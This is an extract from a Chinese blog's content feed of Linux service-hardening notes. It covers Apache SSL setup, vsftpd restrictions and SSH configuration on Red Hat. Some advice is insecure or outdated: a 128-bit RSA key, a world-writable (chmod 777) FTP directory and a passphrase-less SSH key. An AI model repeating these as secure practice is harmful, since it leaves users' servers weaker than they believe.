</code></pre><blockquote><p>这是用 128 位 rsa 算法生成密钥，得到 <code>server.key</code> 文件</p></blockquote><h4 id="生成证书请求文件"><a href="#生成证书请求文件" class="headerlink" title="生成证书请求文件"></a>生成证书请求文件</h4><pre><code class="bash">openssl req -new -key server.key &gt; server.csr
</code></pre><blockquote><p>这是用上面的密钥生成证书请求文件 <code>server.csr</code></p></blockquote><h4 id="生成证书"><a href="#生成证书" class="headerlink" title="生成证书"></a>生成证书</h4><pre><code class="bash">openssl req -x509 -days 365 -key server.key -in server.csr &gt; server.crt
</code></pre><blockquote><p>这是用前面生成的密钥和证书请求生成证书 <code>server.crt</code>，-days 参数指明证书有效期，单位为天</p></blockquote><h4 id="生成证书和密钥的例子"><a href="#生成证书和密钥的例子" class="headerlink" title="生成证书和密钥的例子"></a>生成证书和密钥的例子</h4><blockquote><p>注意路径，记住它。</p></blockquote><p><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-apache-9.png" alt="APACHE 服务安全配置"></p><h3 id="确认是否安装-ssl-模块"><a href="#确认是否安装-ssl-模块" class="headerlink" title="确认是否安装 ssl 模块"></a>确认是否安装 ssl 模块</h3><blockquote><p>只要确定系统中有 <code>mod_ssl.so</code> 文件，就可以确定已经安装好 ssl 模块。记住路径吧！</p></blockquote><pre><code class="bash">find / -iname &quot;*mod_ssl.so*&quot;    # 使用 find 命令进行搜索
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-apache-8.png" alt="APACHE 服务安全配置"></p><h3 id="配置-APACHE"><a href="#配置-APACHE" class="headerlink" title="配置 APACHE"></a>配置 APACHE</h3><h4 id="配置-httpd-ssl-conf-文件"><a href="#配置-httpd-ssl-conf-文件" class="headerlink" title="配置 httpd-ssl.conf 文件"></a>配置 httpd-ssl.conf 文件</h4><blockquote><p>注意在此文件中配置证书和密钥，注意路径，这里就使用上面的路径。</p></blockquote><p>系统中可能没有此文件，可以先创建它，<code>For Example:</code></p><pre><code class="bash">vim /etc/httpd/conf/httpd-ssl.conf
</code></pre><p>修改主配置文件，添加如下内容，<code>For Example:</code></p><pre><code class="bash">SSLCertificateFile /home/server.crt
SSLCertificateKeyFile /home/server.key
</code></pre><h4 id="配置-httpd-conf-文件"><a href="#配置-httpd-conf-文件" class="headerlink" title="配置 httpd.conf 文件"></a>配置 httpd.conf 文件</h4><h5 id="虚拟机设置"><a href="#虚拟机设置" class="headerlink" title="虚拟机设置"></a>虚拟机设置</h5><p>修改主配置文件，<code>For Example:</code></p><pre><code class="bash">NameVirtualHost *:443

&lt;VirtualHost *:443&gt;
  ...
&lt;/VirtualHost&gt;
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-apache-10.png" alt="APACHE 服务安全配置"></p><h5 id="修改主配置文件"><a href="#修改主配置文件" class="headerlink" title="修改主配置文件"></a>修改主配置文件</h5><blockquote><p>打开 ssl 模块，并引入配置文件</p></blockquote><p>修改主配置文件，<code>For Example:</code></p><pre><code class="bash">LoadModule ssl_module /usr/lib/httpd/modules/mod_ssl.so
Include &quot;/etc/httpd/conf/httpd-ssl.conf&quot;
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-apache-11.png" alt="APACHE 服务安全配置"></p><blockquote><p>这里提供简洁方法，在 vi 下使用 <code>:r !find / -iname &quot;*mod_ssl.so*&quot;</code>，在配置文件中也可以很任性的将 <code>httpd-ssl.conf</code> 里的内容填入主配置文件。</p></blockquote><p>修改主配置文件，<code>For Example:</code></p><pre><code class="bash">LoadModule ssl_module /usr/lib/httpd/modules/mod_ssl.so
SSLCertificateFile /home/server.crt
SSLCertificateKeyFile /home/server.key
</code></pre><p>以上的配置写在任何地方均生效，但要注意的是配置中可能没有以下选项，需要手动添加，<code>For Example:</code></p><pre><code class="bash">SSLEngine on
</code></pre><p>但是最好还是写在 <code>&lt;VirtualHost *:443&gt;&lt;/VirtualHost&gt;</code> 这个地方，<code>For Example:</code></p><pre><code class="bash">&lt;VirtualHost *:443&gt;
  LoadModule ssl_module /usr/lib/httpd/modules/mod_ssl.so
  SSLEngine on
  SSLCertificateFile /home/server.crt
  SSLCertificateKeyFile /home/server.key
&lt;/VirtualHost&gt;
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-apache-16.png" alt="APACHE 服务安全配置"></p><h4 id="将监听-80-端口注释"><a href="#将监听-80-端口注释" class="headerlink" title="将监听 80 端口注释"></a>将监听 80 端口注释</h4><blockquote><p>如果不注释的话，依然还可以通过 <code>http</code> 方式访问，注释掉，只能使用 <code>https</code> 方式访问。</p></blockquote><p><code>For Example:</code><br></p><p><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-apache-12.png" alt="APACHE 服务安全配置"></p><h3 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h3><blockquote><p>配置好了，重启服务，接下来就可以愉快的使用 <code>https</code> 来访问了。</p></blockquote><p><code>For Example:</code><br></p><p><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-apache-13.png" alt="APACHE 服务安全配置"></p><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> liunx </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Liunx </tag>
            
            <tag> Security </tag>
            
            <tag> Protocol </tag>
            
            <tag> Service </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Liunx 服务配置笔记（三）：FTP 服务安全配置]]></title>
      <url>/2016/09/liunx-service-ftp/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>本篇是 Liunx 的服务配置笔记系列第三篇，这一篇将具体介绍 Red Hat Liunx 下 FTP 服务的安全配置。确切的说，应该叫它 vsFTP，就是文件的上传和下载服务，主要的功能是在服务器与客户端之间进行文件的传输<a id="more"></a></p><h1 id="配置文件的位置"><a href="#配置文件的位置" class="headerlink" title="配置文件的位置"></a>配置文件的位置</h1><p>主配置文件：<strong>/etc/vsftpd/vsftpd.conf</strong></p><h1 id="服务的启动与停止"><a href="#服务的启动与停止" class="headerlink" title="服务的启动与停止"></a>服务的启动与停止</h1><blockquote><p>FTP 的服务名并不叫做 <code>vsftp</code>，而是 <code>vsftpd</code>。<br><br>修改配置文件过后一定要重启 <code>vsftpd</code> 服务。</p></blockquote><pre><code class="bash">service vsftpd status        # 状态
service vsftpd start         # 启动
service vsftpd stop          # 暂停
service vsftpd restart       # 重启
</code></pre><h1 id="服务的安装"><a href="#服务的安装" class="headerlink" title="服务的安装"></a>服务的安装</h1><h2 id="创建挂载目录"><a href="#创建挂载目录" class="headerlink" title="创建挂载目录"></a>创建挂载目录</h2><p><code>For Example:</code></p><pre><code class="bash">mkdir -p /mnt/cdrom
</code></pre><h2 id="挂载光盘"><a href="#挂载光盘" class="headerlink" title="挂载光盘"></a>挂载光盘</h2><p><code>For Example:</code></p><pre><code class="bash">mount /dev/cdrom /mnt/cdrom
</code></pre><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><code>For Example:</code></p><pre><code class="bash">cd /mnt/cdrom/Server
rpm -ivh vsftpd-2.0.5-16.e15i386.rpm
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-ftp-1.png" alt="FTP 安全配置"></p><h1 id="安全配置"><a href="#安全配置" class="headerlink" title="安全配置"></a>安全配置</h1><h2 id="禁止匿名用户登录"><a href="#禁止匿名用户登录" class="headerlink" title="禁止匿名用户登录"></a>禁止匿名用户登录</h2><p><code>Default Configuration:</code></p><pre><code class="bash">anonymous_enable=YES
</code></pre><blockquote><p>默认的值是允许的，这样匿名用户就可以不需要密码就可以登录 FTP 了，这样很不安全，把它修改成 NO 吧。</p></blockquote><p><code>Example Configuration:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-ftp-7.png" alt="FTP 安全配置"></p><h3 id="使用客户端进行验证"><a href="#使用客户端进行验证" class="headerlink" title="使用客户端进行验证"></a>使用客户端进行验证</h3><blockquote><p>验证之前，请重启服务。我们就直接使用 FTP 用户登录吧。</p></blockquote><p><code>Connection Format:</code></p><pre><code class="bash">ftp [host]
</code></pre><p>若没有成功登录，则会显示</p><pre><code class="bash">530 Login incorrect.
</code></pre><p>使用 <code>bye</code>，可以退出 FTP，成功则会显示</p><pre><code class="bash">221 Googbye
</code></pre><p><code>Example Connection:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-ftp-8.png" alt="FTP 安全配置"></p><h2 id="使用户不能登录系统，但可以登录-FTP"><a href="#使用户不能登录系统，但可以登录-FTP" class="headerlink" title="使用户不能登录系统，但可以登录 FTP"></a>使用户不能登录系统，但可以登录 FTP</h2><blockquote><p>首先要创建一个普通的用户，使他不能登录系统，只需设置登录的 shell 就好了。</p></blockquote><p>创建一个新用户，别忘了设置密码，<code>For Example:</code></p><pre><code class="bash">useradd -s /sbin/nologin test
passwd test
</code></pre><p><code>For Example:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-ftp-9.png" alt="FTP 安全配置"></p><h3 id="使用客户端进行验证-1"><a href="#使用客户端进行验证-1" class="headerlink" title="使用客户端进行验证"></a>使用客户端进行验证</h3><blockquote><p>验证之前，请重启服务。这时候，我们就要使用之前创建的用户进行验证了。</p></blockquote><p>若登录成功，则会显示</p><pre><code class="bash">230 Login successful
</code></pre><p><code>Example Configuration:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-ftp-11.png" alt="FTP 安全配置"></p><h2 id="禁止用户写入或者上传文件"><a href="#禁止用户写入或者上传文件" class="headerlink" title="禁止用户写入或者上传文件"></a>禁止用户写入或者上传文件</h2><p><code>Default Configuration:</code><br></p><pre><code class="bash">write_enable=YES
</code></pre><blockquote><p>默认是允许用户进行上传或者写入文件，我们可以根据需求进行修改。</p></blockquote><p><code>Example Configuration:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-ftp-12.png" alt="FTP 安全配置"></p><h3 id="使用客户端进行验证-2"><a href="#使用客户端进行验证-2" class="headerlink" title="使用客户端进行验证"></a>使用客户端进行验证</h3><blockquote><p>验证之前，请重启服务。这时候，我们仍然使用之前创建的用户进行验证。</p></blockquote><p>无法创建目录，则会显示</p><pre><code class="bash">550 Permission denied
</code></pre><p>尝试切换目录，成功则会显示</p><pre><code class="bash">250 Directory successfully changed.
</code></pre><p><code>Example Connection:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-ftp-12.png" alt="FTP 安全配置"></p><h2 id="配置空闲会话中断时间"><a href="#配置空闲会话中断时间" class="headerlink" title="配置空闲会话中断时间"></a>配置空闲会话中断时间</h2><p><code>Default Configuration:</code></p><pre><code class="bash">#idle_session_timeout=600
</code></pre><blockquote><p>默认的配置时间是十分钟，（默认的单位为秒），我们可以根据需求进行修改。</p></blockquote><p><code>Example Configuration:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-ftp-2.png" alt="FTP 安全配置"></p><h3 id="使用客户端进行验证-3"><a href="#使用客户端进行验证-3" class="headerlink" title="使用客户端进行验证"></a>使用客户端进行验证</h3><blockquote><p>验证之前，请重启服务。成功登录之后，我们等待一段时间，在进行操作。</p></blockquote><p>若超时，则会显示</p><pre><code class="bash">421 Timeout
</code></pre><p><code>Example Connection:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-ftp-3.png" alt="FTP 安全配置"></p><h2 id="配置数据连接超时时间"><a href="#配置数据连接超时时间" class="headerlink" title="配置数据连接超时时间"></a>配置数据连接超时时间</h2><p><code>Default Configuration:</code></p><pre><code class="bash">#data_connection_timeout=120
</code></pre><blockquote><p>默认的配置是两分钟，（默认的单位为秒），我们可以根据需求进行修改。</p></blockquote><p><code>Example Connection:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-ftp-4.png" alt="FTP 安全配置"></p><h3 id="使用客户端进行验证-4"><a href="#使用客户端进行验证-4" class="headerlink" title="使用客户端进行验证"></a>使用客户端进行验证</h3><blockquote><p>此选项需要在传输数据的时候可用，这里不再进行演示。</p></blockquote><h2 id="限制普通用户只能在家目录中"><a href="#限制普通用户只能在家目录中" class="headerlink" title="限制普通用户只能在家目录中"></a>限制普通用户只能在家目录中</h2><p><code>Default Configuration:</code></p><pre><code class="bash">#chroot_list_enable=YES
#chroot_list_file=/etc/vsftpd/chroot_list
</code></pre><blockquote><p>默认是允许用户跳出自己的家目录的，我们可以限制他只能在自己的家目录里。注意，要将用户限制在家目录中，还需要设置 ‘chroot_local_user=YES’。</p></blockquote><p><code>Example Configuration:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-ftp-5.png" alt="FTP 安全配置"></p><blockquote><p>别忘了将禁止的用户添加至 <code>/etc/vsftpd/chroot_list</code></p></blockquote><h3 id="使用客户端进行验证-5"><a href="#使用客户端进行验证-5" class="headerlink" title="使用客户端进行验证"></a>使用客户端进行验证</h3><blockquote><p>验证之前，请重启服务。这时候，我们仍然使用之前创建的用户进行验证。</p></blockquote><p>不能切换目录，则会显示</p><pre><code class="bash">550 Failed to changed directory.
</code></pre><p><code>Example Connection:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-ftp-6.png" alt="FTP 安全配置"></p><h2 id="设置黑名单"><a href="#设置黑名单" class="headerlink" title="设置黑名单"></a>设置黑名单</h2><p><code>Default Configuration:</code></p><pre><code class="bash">userlist_enable=YES
</code></pre><blockquote><p>默认情况下就是开启的，若无开启，我们可以根据需求进行修改。</p></blockquote><p><code>Example Configuration:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-ftp-13.png" alt="FTP 安全配置"></p><blockquote><p>别忘了，将禁止的用户填入 <code>/etc/vsftpd/ftpusers</code></p></blockquote><h3 id="使用客户端进行验证-6"><a href="#使用客户端进行验证-6" class="headerlink" title="使用客户端进行验证"></a>使用客户端进行验证</h3><blockquote><p>验证之前，请重启服务。这时候，我们新建一个用户，然后将其加入黑名单，再进行验证。</p></blockquote><p>新建用户，<code>For Example:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-ftp-14.png" alt="FTP 安全配置"></p><p>添加至黑名单，<code>For Example:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-ftp-15.png" alt="FTP 安全配置"></p><p><code>Example Connection:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-ftp-16.png" alt="FTP 安全配置"></p><h2 id="配置虚拟用户登录"><a href="#配置虚拟用户登录" class="headerlink" title="配置虚拟用户登录"></a>配置虚拟用户登录</h2><h3 id="先安装-db4"><a href="#先安装-db4" class="headerlink" title="先安装 db4"></a>先安装 db4</h3><p><code>For Example:</code></p><pre><code class="bash">rpm -ivh db4-utils-4.3.29-10.el5.i386.rpm
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-ftp-17.png" alt="FTP 安全配置"></p><h3 id="生成虚拟用户口令库文件"><a href="#生成虚拟用户口令库文件" class="headerlink" title="生成虚拟用户口令库文件"></a>生成虚拟用户口令库文件</h3><p><code>For Example:</code></p><pre><code class="bash">vim /etc/vsftpd/login.txt
</code></pre><blockquote><p>需要注意的是，该文件的格式如下，单数行为用户名，偶数行为口令。</p></blockquote><p><code>Example Configuration:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-ftp-18.png" alt="FTP 安全配置"></p><h3 id="生成口令库文件，并修改其权限"><a href="#生成口令库文件，并修改其权限" class="headerlink" title="生成口令库文件，并修改其权限"></a>生成口令库文件，并修改其权限</h3><p><code>For Example:</code></p><pre><code class="bash">db_load -T -t hash -f /etc/vsftpd/login.txt /etc/vsftpd/login.db
chmod 600 /etc/vsftpd/login.db
</code></pre><blockquote><p>注意要设置权限，只有 root 用户拥有读写权限。</p></blockquote><p><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-ftp-19.png" alt="FTP 安全配置"></p><h3 id="修改虚拟用户的-PAM-文件"><a href="#修改虚拟用户的-PAM-文件" class="headerlink" title="修改虚拟用户的 PAM 文件"></a>修改虚拟用户的 PAM 文件</h3><p><code>For Example:</code></p><pre><code class="bash">vim /etc/pam.d/vsftpd
</code></pre><blockquote><p>加入如下内容，其他的全部注释掉</p></blockquote><p><code>Example Configuration:</code></p><pre><code class="bash">auth required pam_userdb.so db=/etc/vsftpd/login
account required pam_userdb.so db=/etc/vsftpd/login
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-ftp-20.png" alt="FTP 安全配置"></p><blockquote><p>数据文件的地址，记得要写对哦。</p></blockquote><h3 id="建立虚拟用户，并设置权限"><a href="#建立虚拟用户，并设置权限" class="headerlink" title="建立虚拟用户，并设置权限"></a>建立虚拟用户，并设置权限</h3><p><code>For Example:</code></p><pre><code class="bash">useradd -d /home/ftp -s /sbin/nologin virtual
chmod 777 /home/ftp
passwd virtual
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-ftp-21.png" alt="FTP 安全配置"></p><h4 id="修改主配置文件"><a href="#修改主配置文件" class="headerlink" title="修改主配置文件"></a>修改主配置文件</h4><p>添加如下内容，<code>For Example:</code></p><pre><code class="bash">guest_enable=YES
guest_username=virtual
user_config_dir=/etc/vsftpd_user_conf
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-ftp-24.png" alt="FTP 安全配置"></p><h4 id="创建配置文件存放目录"><a href="#创建配置文件存放目录" class="headerlink" title="创建配置文件存放目录"></a>创建配置文件存放目录</h4><p>此目录一定要与配置文件中的一致，<code>For Example:</code></p><pre><code class="bash">mkdir -p /etc/vsftpd_user_conf
</code></pre><h4 id="为虚拟用户创建配置文件"><a href="#为虚拟用户创建配置文件" class="headerlink" title="为虚拟用户创建配置文件"></a>为虚拟用户创建配置文件</h4><p>为虚拟口令库中的每个用户分别创建一个配置文件，配置文件中的配置于匿名用户的配置相差无几。</p><p>先创建配置文件，<code>For Example:</code></p><pre><code class="bash">vim /etc/vsftpd_user_conf/ftp_test
</code></pre><p>在配置文件中配置如下内容，<code>Example Configuration:</code></p><pre><code class="bash">anon_world_readable_only=NO               # 是否允许浏览 FTP 目录和下载
anon_upload_enable=YES                    # 是否允许上传
write_enable=YES                          # 是否有写权限
download_enable=YES                       # 是否允许下载文件
anon_mkdir_write_enable=YES               # 是否允许建立和删除目录
anon_other_write_enable=YES               # 是否允许改名和删除文件
local_root=/var/ftp/share/123
# 指定虚拟用户在系统用户下面的路径，限制虚拟用户的家目录，虚拟用户登录后的主目录。
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-ftp-25.png" alt="FTP 安全配置"></p><p>最后只需创建一下虚拟用户登录后的主目录，<code>For Example:</code></p><pre><code class="bash">mkdir -p /var/ftp/share/123
</code></pre><h3 id="登录测试"><a href="#登录测试" class="headerlink" title="登录测试"></a>登录测试</h3><blockquote><p>这时候就要使用虚拟用户口令库文件里的用户名和密码来登录 FTP 服务器</p></blockquote><p><code>Example Connection:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-ftp-23.png" alt="FTP 安全配置"></p><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> liunx </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Liunx </tag>
            
            <tag> Security </tag>
            
            <tag> Protocol </tag>
            
            <tag> Service </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Liunx 服务配置笔记（二）：SSH 服务安全配置]]></title>
      <url>/2016/09/liunx-service-ssh/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>本篇是 Liunx 的服务配置笔记系列第二篇，这一篇将具体介绍 Red Hat Liunx 下 SSH 服务的安全配置。所谓 SSH 就是加密的数据传输，但是使用其的默认配置并不是安全的，所以还需要对其进行详细的配置<a id="more"></a></p><h1 id="配置文件的位置"><a href="#配置文件的位置" class="headerlink" title="配置文件的位置"></a>配置文件的位置</h1><p>主配置文件：<strong>/etc/ssh/sshd_config</strong></p><h1 id="服务的启动与停止"><a href="#服务的启动与停止" class="headerlink" title="服务的启动与停止"></a>服务的启动与停止</h1><blockquote><p>SSH 的服务名并不叫做 <code>ssh</code>，而是 <code>sshd</code>。<br><br>修改配置文件过后一定要重启 <code>sshd</code> 服务。</p></blockquote><pre><code class="bash">service sshd status        # 状态
service sshd start         # 启动
service sshd stop          # 暂停
service sshd restart       # 重启
</code></pre><h1 id="安全配置"><a href="#安全配置" class="headerlink" title="安全配置"></a>安全配置</h1><h2 id="修改端口号"><a href="#修改端口号" class="headerlink" title="修改端口号"></a>修改端口号</h2><p><code>Default Configuration:</code></p><pre><code class="bash"># Port 22
</code></pre><blockquote><p>配置文件中将其注释掉，则采用默认的端口 22，我们可以修改它。去掉 # ，修改成我们想要的端口号。</p></blockquote><p><code>Example Configuration:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-ssh-1.png" alt="SSH 服务安全配置"></p><h3 id="使用客户端进行验证"><a href="#使用客户端进行验证" class="headerlink" title="使用客户端进行验证"></a>使用客户端进行验证</h3><blockquote><p>验证之前，请重启服务。默认是允许 root 用户登录的，以下测试例子是使用 root 用户登录的。</p></blockquote><p>使用默认端口连接，<code>Connection Format:</code></p><pre><code class="bash">ssh [userName]@[host | ip]
</code></pre><p>若端口不对则会显示</p><pre><code class="bash">ssh: connect to host [host | ip] [port] 22: Connection refused
</code></pre><p><code>Example Connection:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-ssh-2.png" alt="SSH 服务安全配置"></p><p>使用配置端口连接，<code>Connection Format:</code></p><pre><code class="bash">ssh [userName]@[host | ip] -p [port]
</code></pre><p>连接成功则会显示</p><pre><code class="bash">Last login: [date] from [host | ip]
</code></pre><p><code>Example Connection:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-ssh-3.png" alt="SSH 服务安全配置"></p><h2 id="禁止-root-用户登录"><a href="#禁止-root-用户登录" class="headerlink" title="禁止 root 用户登录"></a>禁止 root 用户登录</h2><p><code>Default Configuration:</code></p><pre><code class="bash"># PermitRootLogin yes
</code></pre><blockquote><p>默认情况下是允许 root 用户登录的，是十分不安全，毕竟 root 用户权限太大了。我们可以去除 #，将 yes 修改成 no，这就禁止了 root 用户登录。</p></blockquote><p><code>Example Configuration:</code></p><pre><code class="bash">PermitRootLogin no
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-ssh-4.png" alt="SSH 服务安全配置"></p><h3 id="使用客户端进行验证-1"><a href="#使用客户端进行验证-1" class="headerlink" title="使用客户端进行验证"></a>使用客户端进行验证</h3><blockquote><p>验证之前，请重启服务。我们已经禁止 root 用户登录了，以下测试例子仍然使用 root 用户进行验证。</p></blockquote><p>由于之前配置过端口号，这时候就要使用配置的端口号了，<code>Connection Format:</code></p><pre><code class="bash">ssh root@[host | ip] -p [port]
</code></pre><p>使用 <code>exit</code> 可以退出当前的连接，退出成功将会显示</p><pre><code class="bash">Connection to [host | ip] closed
</code></pre><p><code>Example Connection:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-ssh-5.png" alt="SSH 服务安全配置"></p><h2 id="禁止空密码登录"><a href="#禁止空密码登录" class="headerlink" title="禁止空密码登录"></a>禁止空密码登录</h2><p><code>Default Configuration:</code></p><pre><code class="bash"># PermitEmptyPasswords no
</code></pre><blockquote><p>默认情况下，SSH 已经禁止了使用空密码登录系统，即使配置文件中将其注释掉。如果被设置成 yes，则就是不安全的，我们可以修改成 no。</p></blockquote><p><code>Example Configuration:</code></p><pre><code class="bash">PermitEmptyPasswords no
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-ssh-6.png" alt="SSH 服务安全配置"></p><h3 id="使用客户端进行验证-2"><a href="#使用客户端进行验证-2" class="headerlink" title="使用客户端进行验证"></a>使用客户端进行验证</h3><blockquote><p>验证之前，请重启服务。我们已经禁止 root 用户登录了，以下测试我们将使用普通用户。注意：使用普通用户之前，先确保服务端是有该用户的。</p></blockquote><p>由于之前配置过端口号，这时候就要使用配置的端口号了，<code>Connection Format:</code></p><pre><code class="bash">ssh [userName]@[host | ip] -p [port]
</code></pre><p>如果是第一次连接的话，会提示是否保存密钥信息，输入 <code>yes</code> 就好。</p><p><code>Example Connection:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-ssh-7.png" alt="SSH 服务安全配置"></p><p>断开连接，我们尝试使用空密码连接，只需回车就好</p><p><code>Example Connection:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-ssh-8.png" alt="SSH 服务安全配置"></p><h2 id="设置必需使用密码登录"><a href="#设置必需使用密码登录" class="headerlink" title="设置必需使用密码登录"></a>设置必需使用密码登录</h2><p><code>Default Configuration:</code></p><pre><code class="bash"># PasswordAuthentication yes
</code></pre><blockquote><p>默认的配置就是需要使用密码登录的，即使它是注释的。若遇到配置值为 no 的，一定要修改成 yes。</p></blockquote><p><code>Example Configuration:</code></p><pre><code class="bash">PasswordAuthentication yes
</code></pre><h3 id="使用客户端进行验证-3"><a href="#使用客户端进行验证-3" class="headerlink" title="使用客户端进行验证"></a>使用客户端进行验证</h3><blockquote><p>前面已经验证过了，这里不再重复</p></blockquote><h2 id="设置仅允许密钥登录"><a href="#设置仅允许密钥登录" class="headerlink" title="设置仅允许密钥登录"></a>设置仅允许密钥登录</h2><blockquote><p>注意密钥登录是与密码登录是不一样的。只允许密钥登录的时候必须要把允许密码登录的选项禁用。</p></blockquote><p><code>For Example:</code></p><pre><code class="bash">PasswordAuthentication no
</code></pre><p>接下来就是将下图所示的注释去掉，就好了<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-ssh-16.png" alt="SSH 服务安全配置"></p><h3 id="免密码登录"><a href="#免密码登录" class="headerlink" title="免密码登录"></a>免密码登录</h3><p>主机生成密钥对（包含公钥和私钥）</p><pre><code class="bash">ssh-keygen -t rsa -P &quot;&quot;
</code></pre><p>把本地主机的公钥复制到远程主机的 <code>authorized_keys</code> 文件上</p><pre><code class="bash">ssh-copy-id [user]@[server]
</code></pre><h2 id="限制登录失败之后重试次数"><a href="#限制登录失败之后重试次数" class="headerlink" title="限制登录失败之后重试次数"></a>限制登录失败之后重试次数</h2><p><code>Default Configuration:</code></p><pre><code class="bash"># MaxAuthTries 6
</code></pre><blockquote><p>默认情况下可以重试 6 次，如果你觉得这个不合理，当然可以修改它。同理将 # 去除，将 6 修改成我们想要的次数。</p></blockquote><p><code>Example Configuration:</code></p><pre><code class="bash">MaxAuthTries 3
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-ssh-9.png" alt="SSH 服务安全配置"></p><h3 id="使用客户端进行验证-4"><a href="#使用客户端进行验证-4" class="headerlink" title="使用客户端进行验证"></a>使用客户端进行验证</h3><blockquote><p>验证之前，请重启服务。之前我们在服务器上新建了一个用户，那么我们将用这个用户进行连接。</p></blockquote><p>当我们输入错误的密码时，则会显示</p><pre><code class="bash">Permission denied, please try again.
</code></pre><p>当我们最后一次输入错误的密码时，则会显示</p><pre><code class="bash">Permission denied (publickey,gssapi-with-mic,password).
</code></pre><p><code>Example Connection:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-ssh-10.png" alt="SSH 服务安全配置"></p><h2 id="设置多长时间没有成功连接上，就断线"><a href="#设置多长时间没有成功连接上，就断线" class="headerlink" title="设置多长时间没有成功连接上，就断线"></a>设置多长时间没有成功连接上，就断线</h2><p><code>Default Configuration:</code></p><pre><code class="bash"># LoginGraceTime 2m
</code></pre><blockquote><p>默认的等待时间为 2 分钟，如果没有单位将以秒作为单位，可用的单位分别为 h，m、s。我们可以根据需求修改，当然是越短越安全。</p></blockquote><p><code>Example Configuration:</code></p><pre><code class="bash">LoginGraceTime 10s
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-ssh-11.png" alt="SSH 服务安全配置"></p><h3 id="使用客户端进行验证-5"><a href="#使用客户端进行验证-5" class="headerlink" title="使用客户端进行验证"></a>使用客户端进行验证</h3><blockquote><p>验证之前，请重启服务。之前我们在服务器上新建了一个用户，那么我们仍然使用用这个用户进行连接。</p></blockquote><p>我们可以输入一个错误的密码，在等待一段时间，按下回车，则会显示</p><pre><code class="bash">Connection closed by [host | ip]
</code></pre><p><code>Example Connection:</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-ssh-12.png" alt="SSH 服务安全配置"></p><h2 id="设置白名单和黑名单"><a href="#设置白名单和黑名单" class="headerlink" title="设置白名单和黑名单"></a>设置白名单和黑名单</h2><blockquote><p>默认配置中是没有白名单和黑名单这个选项的，我们可以自己添加上去。多个用户之间必须使用空格分割。同理，用户组也一样。</p></blockquote><p><code>白名单</code></p><pre><code class="bash">AllowUsers [userName]1 [userName]2 ...
AllowGroups groupName1 groupName2 ...
</code></pre><p><code>黑名单</code></p><pre><code class="bash">DenyUsers [userName]1 [userName]2 ...
DenyGroups groupName1 groupName2 ...
